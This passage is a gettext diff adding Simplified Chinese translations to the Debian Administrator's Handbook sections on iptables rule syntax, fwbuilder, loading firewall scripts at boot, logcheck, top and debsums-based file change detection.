+msgstr "每个规则可表示为：<literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable><replaceable>action_options</replaceable></literal>。如果同一规则中描述了几个条件，则判断条件是它们的结合（逻辑上的<emphasis>与</emphasis>），比每一个单独的条件限制要严格。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>-p <replaceable>protocol</replaceable></literal> condition matches the protocol field of the IP packet. The most common values are <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal>, and <literal>icmpv6</literal>. Prefixing the condition with an exclamation mark negates the condition, which then becomes a match for “any packets with a different protocol than the specified one”. This negation mechanism is not specific to the <literal>-p</literal> option and it can be applied to all other conditions too."
-msgstr ""
+msgstr "<literal>-p <replaceable>protocol</replaceable></literal> 条件匹配 IP 数据包的协议区段。最常见的是 <literal>tcp</literal>，<literal>udp</literal>，<literal>icmp</literal>，和 <literal>icmpv6</literal>。条件之前加上感叹号表示求反，就变成了“除了指定协议之外的任何数据包”。这种求反机制不仅仅适用于 <literal>-p</literal> 选项，也可用于其它所有条件。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>-s <replaceable>address</replaceable></literal> or <literal>-s <replaceable>network/mask</replaceable></literal> condition matches the source address of the packet. Correspondingly, <literal>-d <replaceable>address</replaceable></literal> or <literal>-d <replaceable>network/mask</replaceable></literal> matches the destination address."
-msgstr ""
+msgstr "<literal>-s <replaceable>address</replaceable></literal> 或 <literal>-s <replaceable>network/mask</replaceable></literal> 条件匹配数据包的源地址。相应地，<literal>-d <replaceable>address</replaceable></literal> 或 <literal>-d <replaceable>network/mask</replaceable></literal> 匹配目的地地址。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>-i <replaceable>interface</replaceable></literal> condition selects packets coming from the given network interface. <literal>-o <replaceable>interface</replaceable></literal> selects packets going out on a specific interface."
-msgstr ""
+msgstr "<literal>-i <replaceable>interface</replaceable></literal> 条件选择源自指定网络接口的数据包。<literal>-o <replaceable>interface</replaceable></literal> 条件选择从指定接口出去的数据包。"
 
 #. Tag: para
 #, no-c-format
 msgid "There are more specific conditions, depending on the generic conditions described above. For instance, the <literal>-p tcp</literal> condition can be complemented with conditions on the TCP ports, with clauses such as <literal>--source-port <replaceable>port</replaceable></literal> and <literal>--destination-port <replaceable>port</replaceable></literal>."
-msgstr ""
+msgstr "根据上述的通用条件，可以定义更具体的条件。例如，<literal>-p tcp</literal> 条件可以和 TCP 端口条件互为补充，就形成例如<literal>--source-port <replaceable>port</replaceable></literal> 和 <literal>--destination-port <replaceable>port</replaceable></literal>。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>--state <replaceable>state</replaceable></literal> condition matches the state of a packet in a connection (this requires the <command>ipt_conntrack</command> kernel module, for connection tracking). The <literal>NEW</literal> state describes a packet starting a new connection; <literal>ESTABLISHED</literal> matches packets belonging to an already existing connection, and <literal>RELATED</literal> matches packets initiating a new connection related to an existing one (which is useful for the <literal>ftp-data</literal> connections in the “active” mode of the FTP protocol)."
-msgstr ""
+msgstr "<literal>--state <replaceable>state</replaceable></literal> 条件匹配连接中某个状态的数据包（这需要 <command>ipt_conntrack</command> 内核模块，用于连接追踪）。<literal>新（NEW）</literal> 状态指明开启新连接的数据包；<literal>建立（ESTABLISHED）</literal> 匹配属于已存在连接的数据包；<literal>相关（RELATED）</literal> 匹配发起与已存在连接相关的数据包（这对处于“活动”模式的 <literal>ftp-data</literal> 连接是很有用的）。"
 
 #. Tag: para
 #, no-c-format
 msgid "The previous section lists available actions, but not their respective options. The <literal>LOG</literal> action, for instance, has the following options:"
-msgstr ""
+msgstr "前面的段落列出了可用的操作，但是没有相应的选项。例如：<literal>记录 LOG</literal> 操作，有如下的选项："
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>--log-priority</literal>, with default value <literal>warning</literal>, indicates the <command>syslog</command> message priority;"
-msgstr ""
+msgstr "<literal>--log-priority</literal>，默认值 <literal>warning</literal>，指明 <command>syslog</command> 消息的优先级；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>--log-prefix</literal> allows specifying a text prefix to differentiate between logged messages;"
-msgstr ""
+msgstr "<literal>--log-prefix</literal> 可用来指定不同文字前缀来区分消息；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>--log-tcp-sequence</literal>, <literal>--log-tcp-options</literal> and <literal>--log-ip-options</literal> indicate extra data to be integrated into the message: respectively, the TCP sequence number, TCP options, and IP options."
-msgstr ""
+msgstr "<literal>--log-tcp-sequence</literal>，<literal>--log-tcp-options</literal> 和 <literal>--log-ip-options</literal> 指定需附加的消息数据：相对应的 TCP 序列号码，TCP 选项，和 IP 选项。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>DNAT</literal> action (only available for IPv4) provides the <literal>--to-destination <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> option to indicate the new destination IP address and/or port. Similarly, <literal>SNAT</literal> provides <literal>--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> to indicate the new source IP address and/or port."
-msgstr ""
+msgstr "<literal>DNAT</literal> 操作（仅对 IPv4有用）提供<literal>--to-destination <replaceable>address</replaceable>：<replaceable>port</replaceable></literal> 选项指明新的目的地 IP 地址和端口号。类似地，<literal>SNAT</literal> 提供了 <literal>--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> 用以指明新的源 IP 地址和端口号。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>REDIRECT</literal> action (only available for IPv4) provides the <literal>--to-ports <replaceable>port(s)</replaceable></literal> option to indicate the port, or port range, where the packets should be redirected."
-msgstr ""
+msgstr "<literal>重定向（REDIRECT）</literal> 操作（仅对 IPv4有效）提供了<literal>--to-ports <replaceable>port(s)</replaceable></literal> 选项用以指明数据包需重定向的端口，或者端口范围。"
 
 #. Tag: title
 #, no-c-format
 msgid "Creating Rules"
-msgstr ""
+msgstr "创建规则"
 
 #. Tag: para
 #, no-c-format
 msgid "Each rule creation requires one invocation of <command>iptables</command>/<command>ip6tables</command>. Typing these commands manually can be tedious, so the calls are usually stored in a script so that the same configuration is set up automatically every time the machine boots. This script can be written by hand, but it can also be interesting to prepare it with a high-level tool such as <command>fwbuilder</command>."
-msgstr ""
+msgstr "每次创建规则需要使用 <command>iptables</command>/<command>ip6tables</command>命令。手工输入这些命令是繁琐的，可以将调用存储在脚本中，这样机器每次启动后就可以进行同样的自动配置。脚本可以手工输入，但是也可以使用很有趣的高级工具（例如，<command>fwbuilder</command>）来准备。"
 
 #. Tag: para
 #, no-c-format
 msgid "The principle is simple. In the first step, one needs to describe all the elements that will be involved in the actual rules:"
-msgstr ""
+msgstr "规则很简单。第一步，列出所有要调用的规则元素："
 
 #. Tag: para
 #, no-c-format
 msgid "the firewall itself, with its network interfaces;"
-msgstr ""
+msgstr "防火墙自身以及网络接口；"
 
 #. Tag: para
 #, no-c-format
 msgid "the networks, with their corresponding IP ranges;"
-msgstr ""
+msgstr "网络，及其相应的 IP 范围；"
 
 #. Tag: para
 #, no-c-format
 msgid "the servers;"
-msgstr ""
+msgstr "服务器；"
 
 #. Tag: para
 #, no-c-format
 msgid "the ports belonging to the services hosted on the servers."
-msgstr ""
+msgstr "宿主服务器上服务所使用的端口号。"
 
 #. Tag: para
 #, no-c-format
 msgid "The rules are then created with simple drag-and-drop actions on the objects. A few contextual menus can change the condition (negating it, for instance). Then the action needs to be chosen and configured."
-msgstr ""
+msgstr "然后可以使用对象拖拽（drag-and-drop）来创建规则。一些上下文菜单可以改变条件（例如，求反）。然后选择操作和配置。"
 
 #. Tag: para
 #, no-c-format
 msgid "As far as IPv6 is concerned, one can either create two distinct rulesets for IPv4 and IPv6, or create only one and let <command>fwbuilder</command> translate the rules according to the addresses assigned to the objects."
-msgstr ""
+msgstr "至于 IPv6，可以为 IPv4 和 IPv6 分别创建规则集，或者只创建一个并使用 <command>fwbuilder</command> 来根据赋给对象的地址来转化规则。"
 
 #. Tag: title
 #, no-c-format
 msgid "Fwbuilder's main window"
-msgstr ""
+msgstr "Fwbuilder 主窗口"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>fwbuilder</command></primary>"
-msgstr ""
+msgstr "<primary><command>fwbuilder</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>fwbuilder</command> can then generate a script configuring the firewall according to the rules that have been defined. Its modular architecture gives it the ability to generate scripts targeting different systems (<command>iptables</command> for Linux 2.4/2.6, <command>ipf</command> for FreeBSD and <command>pf</command> for OpenBSD)."
-msgstr ""
+msgstr "然后 <command>fwbuilder</command> 可以根据已定义的规则产生配置防火墙的脚本。它模块化的架构可以为不同的目标系统产生脚本（Linux 2.4/2.6 上 <command>iptables</command> ， FreeBSD 上 <command>ipf</command>，OpenBSD 上 <command>pf</command>）。"
 
 #. Tag: para
 #, no-c-format
 msgid "Versions of the <emphasis role=\"pkg\">fwbuilder</emphasis> package since <emphasis role=\"distribution\">Squeeze</emphasis> contain both the graphical interface and the modules for each firewall system (these were previously split over several packages, one for each target system):"
-msgstr ""
+msgstr "自从 <emphasis role=\"distribution\">Squeeze</emphasis> 之后的版本 <emphasis role=\"pkg\">fwbuilder</emphasis> 软件包中都包含了图形界面和每种防火墙系统的模块（之前这些模块被分割成多个软件包，每种目标系统一个）："
 
 #. Tag: screen
 #, no-c-format
@@ -559,26 +559,28 @@ msgid ""
 "\n"
 "<computeroutput># </computeroutput><userinput>aptitude install fwbuilder</userinput>\n"
 msgstr ""
+"\n"
+"<computeroutput># </computeroutput><userinput>aptitude install fwbuilder</userinput>\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Installing the Rules at Each Boot"
-msgstr ""
+msgstr "每次启动时加载规则"
 
 #. Tag: para
 #, no-c-format
 msgid "If the firewall is meant to protect an intermittent PPP network connection, the simplest way to deploy the script is to install it as <filename>/etc/ppp/ip-up.d/0iptables</filename> (note that only files without a dot in their name are taken into account). The firewall will thus be reloaded every time a PPP connection is established."
-msgstr ""
+msgstr "如果防火墙准备用于间歇性的 PPP 网络连接，最简单的方法就是将脚本作为 <filename>/etc/ppp/ip-up.d/0iptables</filename> 安装（注意文件名中不包含点的文件才会起作用）。这样每次 PPP 连接之后防火墙就会被从新加载。"
 
 #. Tag: para
 #, no-c-format
 msgid "In other cases, the recommended way is to register the configuration script in an <literal>up</literal> directive of the <filename>/etc/network/interfaces</filename> file. In the following example, the script is stored under <filename>/usr/local/etc/arrakis.fw</filename>."
-msgstr ""
+msgstr "其他情况下，推荐的方法是将配置脚本在 <literal>up</literal> 目录下作为 <filename>/etc/network/interfaces</filename> 文件。在后面的例子中，脚本存储在  <filename>/usr/local/etc/arrakis.fw</filename>。"
 
 #. Tag: title
 #, no-c-format
 msgid "<filename>interfaces</filename> file calling firewall script"
-msgstr ""
+msgstr "<filename>接口（interfaces）</filename> 文件调用防火墙脚本"
 
 #. Tag: programlisting
 #, no-c-format
@@ -591,301 +593,308 @@ msgid ""
 "    broadcast 192.168.0.255\n"
 "    up /usr/local/etc/arrakis.fw\n"
 msgstr ""
+"auto eth0\n"
+"iface eth0 inet static\n"
+"    address 192.168.0.1\n"
+"    network 192.168.0.0\n"
+"    netmask 255.255.255.0\n"
+"    broadcast 192.168.0.255\n"
+"    up /usr/local/etc/arrakis.fw\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Supervision: Prevention, Detection, Deterrence"
-msgstr ""
+msgstr "监督：预防，检测，威慑"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>monitoring</primary>"
-msgstr ""
+msgstr "<primary>监视</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Monitoring is an integral part of any security policy for several reasons. Among them, that the goal of security is usually not restricted to guaranteeing data confidentiality, but it also includes ensuring availability of the services. It is therefore imperative to check that everything works as expected, and to detect in a timely manner any deviant behavior or change in quality of the service(s) rendered. Monitoring activity can enable the detection of intrusion attempts and enable a swift reaction before they cause grave consequences. This section reviews some tools that can be used to monitor several aspects of a Debian system. As such, it completes the section dedicated to generic system monitoring in <xref linkend=\"advanced-administration\" />."
-msgstr ""
+msgstr "监视是安全策略不可或缺的一部分，有几个原因。其中，保护的目的通常不限于确保数据机密性，也包括服务的有效性。因此就有必要检测一切正常，并及时侦测异常行为或者所呈现的服务质量的改变。监视活动可以发现入侵尝试并在他们导致严重后果之前迅速反应。本节回顾一些可以用于监视 Debian 系统的工具。因此，它补充了在 <xref linkend=\"advanced-administration\" /> 中一般系统监视部分。"
 
 #. Tag: title
 #, no-c-format
 msgid "Monitoring Logs with <command>logcheck</command>"
-msgstr ""
+msgstr "使用 <command>logcheck</command> 监视日志"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>logcheck</command></primary>"
-msgstr ""
+msgstr "<primary><command>logcheck</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>logs</primary><secondary>monitoring</secondary>"
-msgstr ""
+msgstr "<primary>日志</primary><secondary>监视</secondary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>monitoring</primary><secondary>log files</secondary>"
-msgstr ""
+msgstr "<primary>监视</primary><secondary>日志文件</secondary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>logcheck</command> program monitors log files every hour by default. It sends unusual log messages in emails to the administrator for further analysis."
-msgstr ""
+msgstr "<command>logcheck</command> 程序默认每小时监视日志文件。它会把异常日志信息通过邮件发给管理员分析。"
 
 #. Tag: para
 #, no-c-format
 msgid "The list of monitored files is stored in <filename>/etc/logcheck/logcheck.logfiles</filename>; the default values work fine if the <filename>/etc/syslog.conf</filename> file has not been completely overhauled."
-msgstr ""
+msgstr "要监视的文件清单存储在 <filename>/etc/logcheck/logcheck.logfiles</filename>；如果 <filename>/etc/syslog.conf</filename> 文件没有被彻底修改，使用默认值就能很好工作。"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>logcheck</command> can work in one of three more or less detailed modes: <emphasis>paranoid</emphasis>, <emphasis>server</emphasis> and <emphasis>workstation</emphasis>. The first one is <emphasis>very</emphasis> verbose, and should probably be restricted to specific servers such as firewalls. The second (and default) mode is recommended for most servers. The last one is designed for workstations, and is even terser (it filters out more messages)."
-msgstr ""
+msgstr "<command>logcheck</command> 可以以三种模式中的一种或几种工作：<emphasis>偏执（paranoid）</emphasis>, <emphasis>服务器（server）</emphasis> 和 <emphasis>工作站（workstation）</emphasis>。第一种模式是<emphasis>非常</emphasis>详细的，应该只限于特殊服务器，例如防火墙。推荐大多数服务器使用第二个（也是默认）模式。最后一个用于工作站，更简明（过滤掉了更多信息）。"
 
 #. Tag: para
 #, no-c-format
 msgid "In all three cases, <command>logcheck</command> should probably be customized to exclude some extra messages (depending on installed services), unless the admin really wishes to receive hourly batches of long uninteresting emails. Since the message selection mechanism is rather complex, <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> is a required — if challenging — read."
-msgstr ""
+msgstr "在三种情况下，<command>logcheck</command> 可以被定制以排除某些信息（取决于安装的服务），除非管理员真想每小时收到一批不感兴趣的邮件。由于信息筛选机制相当复杂，如果碰到问题就需要翻阅 <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename>。"
 
 #. Tag: para
 #, no-c-format
 msgid "The applied rules can be split into several types:"
-msgstr ""
+msgstr "适用的规则可以分成几种类型："
 
 #. Tag: para
 #, no-c-format
 msgid "those that qualify a message as a cracking attempt (stored in a file in the <filename>/etc/logcheck/cracking.d/</filename> directory);"
-msgstr ""
+msgstr "被认为是尝试侵入的信息（文件存储在 <filename>/etc/logcheck/cracking.d/</filename> 目录中）；"
 
 #. Tag: para
 #, no-c-format
 msgid "those canceling such a qualification (<filename>/etc/logcheck/cracking.ignore.d/</filename>);"
-msgstr ""
+msgstr "取消限制的信息（<filename>/etc/logcheck/cracking.ignore.d/</filename>）；"
 
 #. Tag: para
 #, no-c-format
 msgid "those classifying a message as a security alert (<filename>/etc/logcheck/violations.d/</filename>);"
-msgstr ""
+msgstr "被标识为安全警报的信息（<filename>/etc/logcheck/violations.d/</filename>）；"
 
 #. Tag: para
 #, no-c-format
 msgid "those canceling this classification (<filename>/etc/logcheck/violations.ignore.d/</filename>);"
-msgstr ""
+msgstr "取消此类标识的信息（<filename>/etc/logcheck/violations.ignore.d/</filename>）；"
 
 #. Tag: para
 #, no-c-format
 msgid "finally, those applying to the remaining messages (considered as <emphasis>system events</emphasis>)."
-msgstr ""
+msgstr "最后是，剩余的信息（可以考虑为<emphasis>系统事件</emphasis>）。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>CAUTION</emphasis> Ignoring a message"
-msgstr ""
+msgstr "<emphasis>注意</emphasis>忽略信息"
 
 #. Tag: para
 #, no-c-format
 msgid "Any message tagged as a cracking attempt or a security alert (following a rule stored in a <filename>/etc/logcheck/violations.d/myfile</filename> file) can only be ignored by a rule in a <filename>/etc/logcheck/violations.ignore.d/myfile</filename> or <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename> file."
-msgstr ""
+msgstr "任何被标识为侵入尝试和安全警报的信息（按照 <filename>/etc/logcheck/violations.d/myfile</filename> 文件中的规则）只能由 <filename>/etc/logcheck/violations.ignore.d/myfile</filename> 或者 <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename> 文件中定义的规则忽略。"
 
 #. Tag: para
 #, no-c-format
 msgid "A system event is always signaled unless a rule in one of the <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> directories states the event should be ignored. Of course, the only directories taken into account are those corresponding to verbosity levels equal or greater than the selected operation mode."
-msgstr ""
+msgstr "系统事件总是会被发送，除非在 <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> 目录中的规则指明某些事件要被忽略。当然，只有相应详细等级等于或大于所选择模式的目录会起作用。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>TIP</emphasis> Your logs as screen background"
-msgstr ""
+msgstr "<emphasis>提示</emphasis> 如同屏幕背景的日志"
 
 #. Tag: para
 #, no-c-format
 msgid "Some administrators like seeing their log messages scroll by in real time; the <command>root-tail</command> command (in the <emphasis role=\"pkg\">root-tail</emphasis>) package can be used to integrate the logs into the background of their graphical desktop. The <command>xconsole</command> program (in the <emphasis>x11-apps</emphasis> package) can also have them scrolling in a small window. Messages are directly taken from <command>syslogd</command> via the <filename>/dev/xconsole</filename> named pipe."
-msgstr ""
+msgstr "有些管理员喜欢实时滚动的看到日志信息；<command>root-tail</command> 命令（在 <emphasis role=\"pkg\">root-tail</emphasis> 中）软件包可以将日志集成到图形桌面的背景。<command>xconsole</command> 程序（在 <emphasis>x11-apps</emphasis> 软件包中）也能让它们在小窗口中滚动。信息通过 <command>syslogd</command> 直接来源于 <filename>/dev/xconsole</filename> 命名管道。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>root-tail</command></primary>"
-msgstr ""
+msgstr "<primary><command>root-tail</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>logs</primary><secondary>display</secondary>"
-msgstr ""
+msgstr "<primary>日志</primary><secondary>显示</secondary>"
 
 #. Tag: title
 #, no-c-format
 msgid "Monitoring Activity"
-msgstr ""
+msgstr "监视行为"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>monitoring</primary><secondary>activity</secondary>"
-msgstr ""
+msgstr "<primary>监视</primary><secondary>行为</secondary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>activity, monitoring</primary>"
-msgstr ""
+msgstr "<primary>行为，监视</primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "In Real Time"
-msgstr ""
+msgstr "实时"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>top</command> is an interactive tool that displays a list of currently running processes. The default sorting is based on the current amount of processor use and can be obtained with the <keycap>P</keycap> key. Other sort orders include a sort by occupied memory (<keycap>M</keycap> key), by total processor time (<keycap>T</keycap> key) and by process identifier (<keycap>N</keycap> key). The <keycap>k</keycap> key allows killing a process by entering its process identifier. The <keycap>r</keycap> key allows <emphasis>renicing</emphasis> a process, i.e. changing its priority."
-msgstr ""
+msgstr "<command>top</command> 是一个可以显示目前正在运行进程的交互工具。默认排序基于处理器的使用量，可以通过 <keycap>P</keycap> 键获取。其他排序方法包括内存使用量（<keycap>M</keycap> 键），总处理器时间（<keycap>T</keycap> 键）和处理器标识（<keycap>N</keycap> 键）。<keycap>k</keycap> 键允许输入进程标识结束进程。<keycap>r</keycap> 键可以 <emphasis>renicing</emphasis> 进程，例如改变优先级。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>top</command></primary>"
-msgstr ""
+msgstr "<primary><command>top</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "When the system seems to be overloaded, <command>top</command> is a great tool to see which processes are competing for processor time or consume too much memory. In particular, it is often interesting to check if the processes consuming resources match the real services that the machine is known to host. An unknown process running as the www-data user should really stand out and be investigated, since it's probably an instance of software installed and executed on the system through a vulnerability in a web application."
-msgstr ""
+msgstr "当系统过载时，<command>top</command> 是一个很好的工具，用来查看哪个进程抢占处理器或者消耗过多内存。特别是，检查那些进程所消耗的资源是宿主机器服务要使用的。以互联网数据用户身份运行的未知进程应该单列并调查，它很有可能是通过网络应用上的漏洞，在系统上安装并运行的软件。"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>top</command> is a very flexible tool and its manual page gives details on how to customize its display and adapt it to one's personal needs and habits."
-msgstr ""
+msgstr "<command>top</command> 是一个很灵活的工具，手册页中详列了如何定制显示并让其适于个人需求和习惯"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>gnome-system-monitor</command> and <command>qps</command> graphical tools are similar to <command>top</command> and they provide roughly the same features."
-msgstr ""
+msgstr "<command>gnome-system-monitor</command> 和 <command>qps</command> 图形工具和 <command>top</command> 类似，并提供大体上相同的特性。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>TIP</emphasis> Visual representations of activity"
-msgstr ""
+msgstr "<emphasis>提示</emphasis> 活动的可视化表示"
 
 #. Tag: para
 #, no-c-format
 msgid "For more visual (and entertaining) representations of a computer's activity, one should investigate the <emphasis role=\"pkg\">lavaps</emphasis>, <emphasis role=\"pkg\">bubblemon</emphasis> and <emphasis role=\"pkg\">bubblefishymon</emphasis> packages. <command>lavaps</command> displays running processes as the wax bubbles in a lava-lamp. <emphasis>bubblemon</emphasis> is a desktop panel applet representing the amount of used memory and the processor usage as an aquarium with bubbles. <command>bubblefishymon</command> is rather similar, but it also adds fish representing network traffic (and even a duck)."
-msgstr ""
+msgstr "对于更多计算机活动可视化（有趣）的表示方法，可以研究 <emphasis role=\"pkg\">lavaps</emphasis>，<emphasis role=\"pkg\">bubblemon</emphasis> 和 <emphasis role=\"pkg\">bubblefishymon</emphasis> 几个软件包。<command>lavaps</command> 将进程显示为熔岩灯中的蜡泡。<emphasis>bubblemon</emphasis> 是一个桌面应用，可以将处理器和内存用量显示成鱼缸里的气泡。<command>bubblefishymon</command> 比较相似，但是它用鱼（鸭子）表示网络流量。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>gnome-system-monitor</command></primary>"
-msgstr ""
+msgstr "<primary><command>gnome-system-monitor</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>lavaps</command></primary>"
-msgstr ""
+msgstr "<primary><command>lavaps</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>bubblefishymon</command></primary>"
-msgstr ""
+msgstr "<primary><command>bubblefishymon</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis>bubblemon</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis>bubblemon</emphasis></primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "History"
-msgstr ""
+msgstr "历史"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>activity, history</primary>"
-msgstr ""
+msgstr "<primary>活动，历史</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Processor load, network traffic and free disk space are information that are constantly varying. Keeping a history of their evolution is often useful in determining exactly how the computer is used."
-msgstr ""
+msgstr "处理器负载，网络流量和空闲磁盘空间是一直在变化的信息。记录它们的演变常常可以用来确定电脑是如何使用的。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>SNMP</primary>"
-msgstr ""
+msgstr "<primary>SNMP</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>Simple Network Management Protocol</primary>"
-msgstr ""
+msgstr "<primary>简单网络管理协议</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "There are many dedicated tools for this task. Most can fetch data via SNMP (<emphasis>Simple Network Management Protocol</emphasis>) in order to centralize this information. An added benefit is that this allows fetching data from network elements that may not be general-purpose computers, such as dedicated network routers or switches."
-msgstr ""
+msgstr "有很多专门工具可用于此类任务。很多可以通过 SNMP（<emphasis>简单网络管理协议</emphasis>）获取数据，集中信息。这样的好处之一是可以从非通用计算机，例如专用的网络路由器或者交换机上获取数据。"
 
 #. Tag: para
 #, no-c-format
 msgid "This book deals with Munin in some detail (see <xref linkend=\"section.munin\" />) as part of <xref linkend=\"advanced-administration\" xrefstyle=\"select: label quotedtitle\" />. Debian also provides a similar tool, <emphasis role=\"pkg\">cacti</emphasis>. Its deployment is slightly more complex, since it is based solely on SNMP. Despite having a web interface, grasping the concepts involved in configuration still requires some effort. Reading the HTML documentation (<filename>/usr/share/doc/cacti/html/index.html</filename>) should be considered a prerequisite."
-msgstr ""
+msgstr "本书对 Munin 某些方面进行详细介绍（参考 <xref linkend=\"section.munin\" />） 作为 <xref linkend=\"advanced-administration\" xrefstyle=\"select: label quotedtitle\" />的一部分。Debian 也提供了类似工具，<emphasis role=\"pkg\">cacti</emphasis>。部署稍微有些复杂，它只基于 SNMP。尽管有网页界面，掌握配置中涉及的概念仍然需要一些努力。要阅读相关的文档作为基础（<filename>/usr/share/doc/cacti/html/index.html</filename>）。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>ALTERNATIVE</emphasis> <command>mrtg</command>"
-msgstr ""
+msgstr "<emphasis>选择</emphasis> <command>mrtg</command>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>mrtg</command></primary>"
-msgstr ""
+msgstr "<primary><command>mrtg</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>mrtg</command> (in the similarly-named package) is an older tool. Despite some rough edges, it can aggregate historical data and display them as graphs. It includes a number of scripts dedicated to collecting the most commonly monitored data such as processor load, network traffic, web page hits, and so on."
-msgstr ""
+msgstr "<command>mrtg</command>（在相似名称的软件包在）是一个较老的工具。尽管有些不足，但是它可以收集历史数据并以图形显示。它包含了一系列脚本用于收集最常用的监视数据，例如：处理器负载，网络流量，网页点击量，等等。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">mrtg-contrib</emphasis> and <emphasis role=\"pkg\">mrtgutils</emphasis> packages contain example scripts that can be used directly."
-msgstr ""
+msgstr "<emphasis role=\"pkg\">mrtg-contrib</emphasis> 和 <emphasis role=\"pkg\">mrtgutils</emphasis> 软件包含有可以直接使用的示例脚本。"
 
 #. Tag: title
 #, no-c-format
 msgid "Detecting Changes"
-msgstr ""
+msgstr "侦测变化"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the system is installed and configured, and barring security upgrades, there's usually no reason for most of the files and directories to evolve, data excepted. It is therefore interesting to make sure that files actually do not change: any unexpected change would therefore be worth investigating. This section presents a few tools able to monitor files and to warn the administrator when an unexpected change occurs (or simply to list such changes)."
-msgstr ""
+msgstr "系统一旦安装和配置，除非安全更新，通常没有理由改变大部分文件和目录，数据除外。因此，要注意确保文件没有改变：任何非预期的变化都值得探究。本节介绍几个可以在非预期变化发生时监视文件并警告管理员（或者只列出变化）的工具。"
 
 #. Tag: title
 #, no-c-format
 msgid "Auditing Packages: <command>debsums</command> and its Limits"
-msgstr ""
+msgstr "审核软件包：<command>debsums</command> 及其限制"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>debsums</command></primary>"
-msgstr ""
+msgstr "<primary><command>debsums</command></primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> Protecting against upstream changes"
-msgstr ""
+msgstr "<emphasis>进阶</emphasis> 防止上游变化"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>debsums</command> is useful in detecting changes to files coming from a Debian package, but it will be useless if the package itself is compromised, for instance if the Debian mirror is compromised. Protecting against this class of attacks involves using APT's digital signature verification system (see <xref linkend=\"sect.package-authentication\" />), and taking care to only install packages from a certified origin."
-msgstr ""
+msgstr "<command>debsums</command> 可以用来侦测源于 Debian 软件包的变化，但是如果软件包本身有问题，它就不起作用了，例如 Debian 被攻破。可以使用 APT 数字签名验证系统防止此类攻击（参考  <xref linkend=\"sect.package-authentication\" />），并只从已认证的源安装软件包"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>debsums</command> is an interesting tool since it allows finding what installed files have been modified (potentially by an attacker), but this should be taken with a grain of salt. First, because not all Debian packages provide the fingerprints required by this program (they can be found in <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename> when they exist). <indexterm><primary>fingerprint</primary></indexterm> <indexterm><primary>control sum</primary></indexterm> <indexterm><primary>MD5</primary></indexterm> <indexterm><primary>SHA1</primary></indexterm> As a reminder: a fingerprint is a value, often a number (even though in hexadecimal notation), that contains a kind of signature for the contents of a file. This signature is calculated with an algorithm (MD5 or SHA1 being well-known examples) that more or less guarantee that even the tiniest change in the file contents implies a change in the fingerprint; this is known as the “avalanche effect”. This allows a simple numerical fingerprint to serve as a litmus test to check whether the contents of a file have been altered. These algorithms are not reversible; in other words, for most of them, knowing a fingerprint doesn't allow finding 